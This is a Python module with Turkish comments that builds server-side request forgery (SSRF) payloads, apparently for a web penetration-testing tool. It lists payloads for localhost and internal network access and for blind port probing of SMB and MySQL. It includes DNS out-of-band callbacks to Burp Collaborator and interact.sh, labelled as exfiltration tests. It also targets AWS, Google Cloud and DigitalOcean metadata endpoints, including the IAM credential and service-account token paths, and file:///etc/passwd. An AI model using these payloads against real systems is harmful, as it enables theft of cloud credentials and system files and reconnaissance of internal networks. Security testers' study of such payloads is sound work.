"""
SSRF payload üreteci modülü
"""
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

class SSRFType(Enum):
    """SSRF türleri"""
    BASIC = "basic"  # Temel SSRF
    BLIND = "blind"  # Kör SSRF
    DNS = "dns"      # DNS tabanlı SSRF
    CLOUD = "cloud"  # Cloud metadata erişimi

class Protocol(Enum):
    """Desteklenen protokoller"""
    HTTP = "http"
    HTTPS = "https"
    FILE = "file"
    DICT = "dict"
    GOPHER = "gopher"
    LDAP = "ldap"
    SMB = "smb"

@dataclass
class SSRFPayload:
    """SSRF payload veri sınıfı"""
    value: str
    ssrf_type: SSRFType
    protocol: Protocol
    description: str
    success_indicators: Optional[List[str]] = None
    metadata_endpoints: Optional[List[str]] = None
    internal_hosts: Optional[List[str]] = None

class PayloadGenerator:
    """SSRF payload üreteci"""
    
    @staticmethod
    def get_basic_payloads() -> List[SSRFPayload]:
        """Temel SSRF payloadları"""
        payloads = [
            SSRFPayload(
                value="http://127.0.0.1",
                ssrf_type=SSRFType.BASIC,
                protocol=Protocol.HTTP,
                description="Localhost erişimi",
                success_indicators=["localhost", "127.0.0.1"]
            ),
            SSRFPayload(
                value="http://localhost",
                ssrf_type=SSRFType.BASIC,
                protocol=Protocol.HTTP,
                description="Localhost erişimi (hostname)",
                success_indicators=["localhost", "127.0.0.1"]
            ),
            SSRFPayload(
                value="http://0.0.0.0",
                ssrf_type=SSRFType.BASIC,
                protocol=Protocol.HTTP,
                description="Tüm arayüzlere erişim",
                success_indicators=["0.0.0.0"]
            )
        ]
        return payloads
    
    @staticmethod
    def get_blind_payloads() -> List[SSRFPayload]:
        """Kör SSRF payloadları"""
        payloads = [
            SSRFPayload(
                value="http://{target}",
                ssrf_type=SSRFType.BLIND,
                protocol=Protocol.HTTP,
                description="Dinamik hedef",
                success_indicators=["connection refused", "timeout"]
            ),
            SSRFPayload(
                value="http://{target}:445",
                ssrf_type=SSRFType.BLIND,
                protocol=Protocol.HTTP,
                description="SMB port taraması",
                success_indicators=["connection refused", "timeout"]
            ),
            SSRFPayload(
                value="http://{target}:3306",
                ssrf_type=SSRFType.BLIND,
                protocol=Protocol.HTTP,
                description="MySQL port taraması",
                success_indicators=["connection refused", "timeout"]
            )
        ]
        return payloads
    
    @staticmethod
    def get_dns_payloads() -> List[SSRFPayload]:
        """DNS tabanlı SSRF payloadları"""
        payloads = [
            SSRFPayload(
                value="http://{random}.burpcollaborator.net",
                ssrf_type=SSRFType.DNS,
                protocol=Protocol.HTTP,
                description="DNS exfiltration testi",
                success_indicators=["dns lookup"]
            ),
            SSRFPayload(
                value="http://{random}.interact.sh",
                ssrf_type=SSRFType.DNS,
                protocol=Protocol.HTTP,
                description="DNS exfiltration testi (interact.sh)",
                success_indicators=["dns lookup"]
            )
        ]
        return payloads
    
    @staticmethod
    def get_cloud_payloads() -> List[SSRFPayload]:
        """Cloud metadata erişim payloadları"""
        payloads = [
            SSRFPayload(
                value="http://169.254.169.254/latest/meta-data/",
                ssrf_type=SSRFType.CLOUD,
                protocol=Protocol.HTTP,
                description="AWS metadata endpoint",
                success_indicators=["ami-id", "instance-id"],
                metadata_endpoints=[
                    "iam/security-credentials/",
                    "public-keys/",
                    "user-data/"
                ]
            ),
            SSRFPayload(
                value="http://metadata.google.internal/computeMetadata/v1/",
                ssrf_type=SSRFType.CLOUD,
                protocol=Protocol.HTTP,
                description="Google Cloud metadata endpoint",
                success_indicators=["instance/", "project/"],
                metadata_endpoints=[
                    "instance/service-accounts/default/token",
                    "project/project-id"
                ]
            ),
            SSRFPayload(
                value="http://169.254.169.254/metadata/v1/",
                ssrf_type=SSRFType.CLOUD,
                protocol=Protocol.HTTP,
                description="DigitalOcean metadata endpoint",
                success_indicators=["droplet_id"],
                metadata_endpoints=[
                    "id",
                    "region",
                    "user-data"
                ]
            )
        ]
        return payloads
    
    @staticmethod
    def get_internal_network_payloads() -> List[SSRFPayload]:
        """İç ağ keşif payloadları"""
        payloads = [
            SSRFPayload(
                value="http://192.168.1.1",
                ssrf_type=SSRFType.BASIC,
                protocol=Protocol.HTTP,
                description="Router/Gateway erişimi",
                internal_hosts=[
                    "192.168.0.0/16",
                    "10.0.0.0/8",
                    "172.16.0.0/12"
                ]
            ),
            SSRFPayload(
                value="http://10.0.0.1",
                ssrf_type=SSRFType.BASIC,
                protocol=Protocol.HTTP,
                description="İç ağ erişimi",
                internal_hosts=[
                    "10.0.0.0/8"
                ]
            ),
            SSRFPayload(
                value="file:///etc/passwd",
                ssrf_type=SSRFType.BASIC,
                protocol=Protocol.FILE,
                description="Yerel dosya erişimi",
                success_indicators=["root:", "nobody:"]
            )
        ]
        return payloads 